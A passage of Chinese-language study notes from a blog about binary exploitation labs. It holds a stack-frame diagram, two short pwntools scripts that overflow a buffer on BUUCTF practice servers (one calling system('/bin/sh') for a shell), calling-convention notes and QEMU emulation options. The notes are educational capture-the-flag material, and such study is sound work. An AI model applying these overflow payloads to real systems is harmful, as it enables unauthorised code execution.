<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">|------------------|  &lt;- 高地址</span><br><span class="line">| 传入参数        |  &lt;- 参数存储区域</span><br><span class="line">|------------------|</span><br><span class="line">| EIP（返回地址）  |  &lt;- 被调用时保存的返回地址</span><br><span class="line">|------------------|</span><br><span class="line">| EBP              |  &lt;- 当前栈帧的基址</span><br><span class="line">|------------------|</span><br><span class="line">| 局部变量（数组）  |  &lt;- 数组存储区域</span><br><span class="line">| s[14]            |  &lt;- 数组的最后一个字节</span><br><span class="line">| s[13]            |</span><br><span class="line">| s[12]            |</span><br><span class="line">| s[11]            |</span><br><span class="line">| s[10]            |</span><br><span class="line">| s[9]             |</span><br><span class="line">| s[8]             |</span><br><span class="line">| s[7]             |</span><br><span class="line">| s[6]             |</span><br><span class="line">| s[5]             |</span><br><span class="line">| s[4]             |</span><br><span class="line">| s[3]             |</span><br><span class="line">| s[2]             |</span><br><span class="line">| s[1]             |</span><br><span class="line">| s[0]             |  &lt;- 数组的第一个字节</span><br><span class="line">|------------------|  &lt;- 低地址</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>返回地址就是EIP下一条指令的位置</p>
</blockquote>
<p>入口函数</p>
<p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410141634119.png" alt="image-20241014163410051"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25760</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">15</span> + p64(<span class="number">0x0000000000401186</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="实验五-栈溢出-利用system函数传参"><a href="#实验五-栈溢出-利用system函数传参" class="headerlink" title="实验五 栈溢出-利用system函数传参"></a>实验五 栈溢出-利用system函数传参</h2><h3 id="32程序"><a href="#32程序" class="headerlink" title="32程序"></a>32程序</h3><p>查看入口函数发现栈溢出漏洞</p>
<p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151044138.png" alt="image-20241015104415044"></p>
<blockquote>
<p>buf字符数组有136个也就是0x88个，但是read能读入0x100个，有0x78个冗余空间，可以实现栈溢出</p>
</blockquote>
<p>寻找到提权函数，找到了string  &#x2F;bin&#x2F;sh 但是没有函数直接执行这个字符串，记录下这个字符串的地址，然后继续查找system函数，发现一个system函数能传入参数调用，因此目标就是利用只能溢出调用system函数并且传入参数</p>
<p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151048132.png" alt="image-20241015104844088"></p>
<p>根据函数调用栈在内存中的结构，实现栈溢出</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25269</span>)</span><br><span class="line"></span><br><span class="line">systemAddress=<span class="number">0x08048320</span></span><br><span class="line">shellAddress=<span class="number">0x0804A024</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>) + p32(systemAddress) +p32(<span class="number">1</span>) + p32(shellAddress)</span><br><span class="line"></span><br><span class="line">p.readline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>x86使用栈返回</p>
<p>64使用寄存器返回</p>
</blockquote>
<p><code>分析payload</code></p>
<ul>
<li><code>b&#39;a&#39;*(0x88+4) </code> 覆盖char[]和ebp</li>
<li><code>p32(systemAddress)</code>覆盖返回地址</li>
<li><code>p32(1)</code>有leave，return，enter没有call，导致了错位一位，错失了eip保存，所以要添加一位代替eip的位置</li>
<li><code>p32(shellAddress)</code>传入的参数</li>
</ul>
<p>备用图片</p>
<p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151051556.png" alt="image-20241015105133466"></p>
<h3 id="64位程序"><a href="#64位程序" class="headerlink" title="64位程序"></a>64位程序</h3><blockquote>
<p>32为程序参数在栈上，64位程序，函数的前6个参数在寄存器里</p>
<p>x86:参数都保存在栈上面</p>
<p>x64:前6个参数一次保存在RDI、RSI、RDX、RCX、R8和R9之中，如果还有更多的参数后保存在栈上</p>
</blockquote>
<h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><p><strong>面向返回编程</strong></p>
<h1 id="QEMU"><a href="#QEMU" class="headerlink" title="QEMU"></a>QEMU</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">模拟不同架构的虚拟机</span></span><br><span class="line">qemu-system-xxxx</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定虚拟机机器类型</span></span><br><span class="line">-M malta # MIPS架构机器类型</span><br><span class="line">-M vexpress-a9 # ARM架构机器类型</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定要加载的内核镜像文件</span></span><br><span class="line">-kernel vmlinuz-3.2.0-4-vexpress</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定虚拟机硬盘</span></span><br><span class="line">-hda</span><br><span class="line">-dribe # 更灵活，可以指定虚拟硬盘属性</span><br><span class="line">-drive file=xxx.qcow2,if=sd,format=qcow2</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定初始 RAM 磁盘（initramfs 或 initrd）映像文件,看映像中有没有</span></span><br><span class="line">-initrd initrd.img-3.2.0-4-vexpress</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">向内核传递命令行参数，root指定根文件系统的位置，console指定控制台输出位置</span></span><br><span class="line">-append &quot;root=/dev/sda1 console=tyy0&quot;</span><br><span class="line"><span class="meta prompt_">	# </span><span class="language-bash">/dev/sda1指的是第一个 SCSI 或 SATA 磁盘的第一个分区，tyy0表示第一个虚拟终端设备</span></span><br><span class="line">-append &quot;root=/dev/mmcblk0p2 console=ttyAMA0&quot;</span><br><span class="line"><span class="meta prompt_">	# </span><span class="language-bash">/dev/mmcblk0p2表示第一个多媒体卡（MMC）或 SD 卡的块设备的第二个分区，ttyAMA0，表示第一个 ARM 串行设备，用于显示内核和系统启动过程的输出。</span></span><br><span class="line"><span class="meta prompt_">	</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置虚拟网络接口的选项</span></span><br><span class="line">-net nic # 创建一个虚拟网络接口，使得虚拟机能够与外部网络或其他虚拟机通信。</span><br><span class="line">-net tap,ifname=tap0 # 创建一个 TAP 网络接口，并使用指定的接口名称tap0与虚拟机连接。</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">基础指令</span></span><br><span class="line">sudo qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta \</span><br><span class="line">        -hda debian_wheezy_mipsel_standard.qcow2 \</span><br><span class="line">        -append &quot;root=/dev/sda1 console=tyy0&quot; \</span><br><span class="line">        -net nic \</span><br><span class="line">        -net tap,ifname=tap0 \</span><br><span class="line">        -nographic</span><br></pre></td></tr></table></figure>

</article><div class="tag_share"><div class="post-share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131914425.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="next-post pull-full" href="/2024/10/13/%E7%89%A9%E8%81%94%E7%BD%91/" title="物联网安全"><img class="cover" src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131914430.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">物联网安全</div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN%E5%B7%A5%E5%85%B7"><span class="toc-text">PWN工具</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn%E5%B7%A5%E5%85%B7"><span class="toc-text">pwn工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GDB"><span class="toc-text">GDB</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwndbg"><span class="toc-text">pwndbg</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFpwndbg"><span class="toc-text">什么是pwndbg?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E7%BB%99pwndbg%E5%88%86%E5%B1%8F"><span class="toc-text">如何给pwndbg分屏?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwndbg%E7%9A%84%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C"><span class="toc-text">pwndbg的基础操作:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E5%92%8Cp%E5%91%BD%E4%BB%A4%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-text">命令和p命令的使用:</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-x-%E5%91%BD%E4%BB%A4"><span class="toc-text">1.x 命令</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E8%AF%B4%E6%98%8E%EF%BC%9A"><span class="toc-text">参数说明：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%EF%BC%9A"><span class="toc-text">示例：</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%86%85%E5%AD%98%E5%9C%B0%E5%9D%80%E7%9A%84%E5%86%85%E5%AE%B9%EF%BC%9A"><span class="toc-text">查看内存地址的内容：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%8F%98%E9%87%8F%E7%9A%84%E5%86%85%E5%AE%B9%EF%BC%9A"><span class="toc-text">查看变量的内容：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-p-%E5%91%BD%E4%BB%A4"><span class="toc-text">2. p 命令</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E8%AF%B4%E6%98%8E%EF%BC%9A-1"><span class="toc-text">参数说明：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%EF%BC%9A-1"><span class="toc-text">示例：</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%89%93%E5%8D%B0%E7%AE%80%E5%8D%95%E5%8F%98%E9%87%8F%EF%BC%9A"><span class="toc-text">打印简单变量：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%89%93%E5%8D%B0%E7%BB%93%E6%9E%84%E4%BD%93%E6%88%90%E5%91%98%EF%BC%9A"><span class="toc-text">打印结构体成员：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%89%93%E5%8D%B0%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E5%80%BC%EF%BC%9A"><span class="toc-text">打印表达式的值：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%B8%B8%E8%A7%81%E7%94%A8%E6%B3%95%E7%A4%BA%E4%BE%8B"><span class="toc-text">3. 常见用法示例</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#3-1-%E6%89%93%E5%8D%B0%E5%8F%98%E9%87%8F%E5%9C%B0%E5%9D%80"><span class="toc-text">3.1 打印变量地址</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-2-%E8%A7%82%E5%AF%9F%E6%95%B0%E7%BB%84"><span class="toc-text">3.2 观察数组</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-3-%E6%89%93%E5%8D%B0%E6%8C%87%E9%92%88%E6%8C%87%E5%90%91%E7%9A%84%E5%80%BC"><span class="toc-text">3.3 打印指针指向的值</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%9F%BA%E7%A1%80"><span class="toc-text">二进制基础</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A1%AC%E4%BB%B6%E7%9F%A5%E8%AF%86"><span class="toc-text">硬件知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%84%E5%AD%98%E5%99%A8"><span class="toc-text">寄存器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E7%AB%AF%E5%BA%8F%E4%B8%8E%E5%B0%8F%E7%AB%AF%E5%BA%8F"><span class="toc-text">大端序与小端序</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6"><span class="toc-text">可执行文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ELF"><span class="toc-text">ELF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AE%B5%EF%BC%88segment%EF%BC%89%E5%92%8C%E8%8A%82%EF%BC%88section%EF%BC%89"><span class="toc-text">段（segment）和节（section）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8A%82"><span class="toc-text">节</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AE%B5"><span class="toc-text">段</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PLT%E5%92%8CGOT"><span class="toc-text">PLT和GOT</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%A7%90%E5%A6%B9%E8%8A%B1PLT%E4%B8%8EGOT"><span class="toc-text">动态链接姐妹花PLT与GOT</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E6%89%A7%E8%A1%8C"><span class="toc-text">进程执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E8%A3%85%E8%BD%BD%E5%92%8C%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98"><span class="toc-text">程序装载和虚拟内存</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98"><span class="toc-text">虚拟内存</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E7%8A%B6%E6%80%81%E4%B8%8E%E6%B1%87%E7%BC%96"><span class="toc-text">程序状态与汇编</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%EF%BC%88X86%EF%BC%89"><span class="toc-text">Linux函数调用栈的实现原理（X86）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E7%BB%93%E6%9E%84"><span class="toc-text">内存结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%84%E5%AD%98%E5%99%A8-1"><span class="toc-text">寄存器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#x86%E5%9F%BA%E7%A1%80"><span class="toc-text">x86基础</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#x86%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8"><span class="toc-text">x86函数调用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#step1%EF%BC%9A%E5%8F%82%E6%95%B0%E5%85%A5%E6%A0%88"><span class="toc-text">step1：参数入栈</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#step2%EF%BC%9A%E6%97%A7%E7%9A%84eip%E5%85%A5%E6%A0%88"><span class="toc-text">step2：旧的eip入栈</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#step3%EF%BC%9A%E4%BF%AE%E6%94%B9eip%E6%8C%87%E5%90%91"><span class="toc-text">step3：修改eip指向</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#step4%EF%BC%9A%E5%B0%86%E6%97%A7%E7%9A%84ebp%E5%85%A5%E6%A0%88"><span class="toc-text">step4：将旧的ebp入栈</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#step5%EF%BC%9Aebp%E5%90%91%E4%B8%8B%E7%A7%BB%E5%8A%A8%E6%8C%87%E5%90%91%E6%96%B0%E6%A0%88%E5%B8%A7%E9%A1%B6%E9%83%A8"><span class="toc-text">step5：ebp向下移动指向新栈帧顶部</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#step6%EF%BC%9Aesp%E5%90%91%E4%B8%8B%E7%A7%BB%E5%8A%A8"><span class="toc-text">step6：esp向下移动</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#step7%EF%BC%9A%E6%89%A7%E8%A1%8Ccallee"><span class="toc-text">step7：执行callee</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#step8%EF%BC%9A%E8%BF%94%E5%9B%9Eesp%E5%9B%9E%E5%88%B0%E5%A0%86%E6%A0%88%E9%A1%B6%E9%83%A8"><span class="toc-text">step8：返回esp回到堆栈顶部</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#step9%EF%BC%9A%E6%81%A2%E5%A4%8D%E6%97%A7%E7%9A%84ebp"><span class="toc-text">step9：恢复旧的ebp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#step10%EF%BC%9A%E5%BC%B9%E5%87%BAeip"><span class="toc-text">step10：弹出eip</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#step11%EF%BC%9A%E4%BB%8E%E5%A0%86%E6%A0%88%E4%B8%AD%E5%88%A0%E9%99%A4%E5%8F%82%E6%95%B0"><span class="toc-text">step11：从堆栈中删除参数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90"><span class="toc-text">实例分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#main%E6%89%A7%E8%A1%8C%E8%BF%87%E7%A8%8B"><span class="toc-text">main执行过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#foo%E5%87%BD%E6%95%B0"><span class="toc-text">foo函数</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ShellCode"><span class="toc-text">ShellCode</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C"><span class="toc-text">实验</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E4%B8%80-nc%E7%9A%84%E4%BD%BF%E7%94%A8%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">实验一 nc的使用与系统命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E4%BA%8C-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-text">实验二 权限提升</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E4%B8%89-%E5%90%91%E6%95%B0%E7%BB%84%E5%A1%AB%E5%85%85%E6%95%B0%E6%8D%AE%E5%B9%B6%E7%AE%80%E5%8D%95%E5%86%99%E4%B8%80%E4%B8%AA%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC"><span class="toc-text">实验三 向数组填充数据并简单写一个攻击脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E5%9B%9B-%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="toc-text">实验四 栈溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E4%BB%8B%E7%BB%8D"><span class="toc-text">原理介绍</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E4%BA%94-%E6%A0%88%E6%BA%A2%E5%87%BA-%E5%88%A9%E7%94%A8system%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82"><span class="toc-text">实验五 栈溢出-利用system函数传参</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#32%E7%A8%8B%E5%BA%8F"><span class="toc-text">32程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#64%E4%BD%8D%E7%A8%8B%E5%BA%8F"><span class="toc-text">64位程序</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ROP"><span class="toc-text">ROP</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#QEMU"><span class="toc-text">QEMU</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url(/img/footer.jpg);"><div id="footer-wrap"><div class="copyright">&copy;2024 By Matrwe</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>